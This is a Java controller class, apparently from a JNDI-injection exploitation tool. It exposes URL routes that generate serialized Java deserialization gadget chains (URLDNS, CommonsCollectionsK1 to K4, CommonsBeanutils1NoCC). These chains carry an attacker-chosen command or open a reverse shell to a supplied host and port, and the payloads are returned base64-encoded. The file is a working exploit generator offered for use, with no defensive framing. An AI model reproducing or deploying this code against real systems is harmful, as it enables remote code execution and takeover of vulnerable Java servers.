package com.example.exploit.controller;

import com.example.exploit.gadget.*;
import com.example.exploit.annotation.JNDIController;
import com.example.exploit.annotation.JNDIMapping;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.util.*;

@JNDIController
@JNDIMapping("/Deserialize")
public class DeserializeController {
    public Hashtable<String, Object> process(Hashtable<String, String> params) throws Exception {
        byte[] data = Base64.getDecoder().decode(params.get("data"));

        Hashtable<String, Object> result = new Hashtable<>();
        result.put("data", data);
        return result;
    }

    @JNDIMapping("/{data}")
    public void deserialize(Hashtable<String, String> params) throws Exception {
        byte[] data =Base64.getUrlDecoder().decode(params.get("data"));
        params.replace("data", Base64.getEncoder().encodeToString(data));
        System.out.println("Custom serialized data");
    }

    @JNDIMapping("/URLDNS/{url}")
    public void URLDNS(Hashtable<String, String> params) throws Exception {
        String url = params.get("url");
        byte[] data = URLDNS.create(url);

        System.out.println("Gadget: URLDNS URL: " + url);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsCollectionsK1/Command/{cmd}")
    public void CommonsCollectionsK1Cmd(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK1.create(templatesImpl);

        System.out.println("Gadget: CommonsCollectionsK1 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsCollectionsK1/ReverseShell/{host}/{port}")
    public void CommonsCollectionsK1ReverseShell(Hashtable<String, String> params) throws Exception {
        String host = params.get("host");
        int port = Integer.parseInt(params.get("port"));
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, port);
        byte[] data = CommonsCollectionsK1.create(templatesImpl);

        System.out.println("Gadget: CommonsCollectionsK1 ReverseShell Host: " + host + " Port: " + port);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
    public void CommonsCollectionsK2Cmd(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK2.create(templatesImpl);

        System.out.println("Gadget: CommonsCollectionsK2 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsCollectionsK2/ReverseShell/{host}/{port}")
    public void CommonsCollectionsK2ReverseShell(Hashtable<String, String> params) throws Exception {
        String host = params.get("host");
        int port = Integer.parseInt(params.get("port"));
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, port);
        byte[] data = CommonsCollectionsK2.create(templatesImpl);

        System.out.println("Gadget: CommonsCollectionsK2 ReverseShell Host: " + host + " Port: " + port);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsCollectionsK3/Command/{cmd}")
    public void CommonsCollectionsK3Cmd(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        byte[] data = CommonsCollectionsK3.create(cmd);

        System.out.println("Gadget: CommonsCollectionsK3 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsCollectionsK4/Command/{cmd}")
    public void CommonsCollectionsK4Cmd(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        byte[] data = CommonsCollectionsK4.create(cmd);

        System.out.println("Gadget: CommonsCollectionsK4 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsBeanutils1NoCC/Command/{cmd}")
    public void CommonsBeanutils1NoCCCmd(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);

        System.out.println("Gadget: CommonsBeanutils1NoCC Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @JNDIMapping("/CommonsBeanutils1NoCC/ReverseShell/{host}/{port}")
    public void CommonsBeanutils1NoCCReverseShell(Hashtable<String, String> params) throws Exception {
        String host = params.get("host");
        int port = Integer.parseInt(params.get("port"));
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, port);
        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);

        System.out.println("Gadget: CommonsBeanutils1NoCC ReverseShell Host: " + host + " Port: " + port);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }
}
